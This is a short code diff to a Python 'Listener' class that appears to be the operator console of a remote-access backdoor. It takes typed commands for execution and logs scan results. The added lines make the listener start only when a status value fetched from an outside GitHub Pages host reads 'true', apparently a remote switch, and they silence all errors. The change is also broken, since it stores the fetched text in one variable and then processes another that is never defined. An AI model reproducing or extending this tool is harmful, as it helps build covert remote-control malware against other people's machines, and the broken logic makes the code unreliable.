@@ -50,7 +50,7 @@ class Listener():
                 f.write(scan_result)
                 f.close()
         print (scan_result)
-        
+
     def run(self):
         while True:
             cmd = input("> ")
@@ -68,9 +68,13 @@ class Listener():
                 result = "[-] Error during command execution."
             print (result)
 
+
+s = requests.get('https://poggerpussy.github.io').text
+status = re.sub(r"<.*?>",'', status)
 try:
     if status == "true":
         app = Listener("127.0.0.1", 80)
         app.run()
-except:
-    raise Exception("[-] Error Occured")
+except Exception as e:
+    print (e)
+    pass
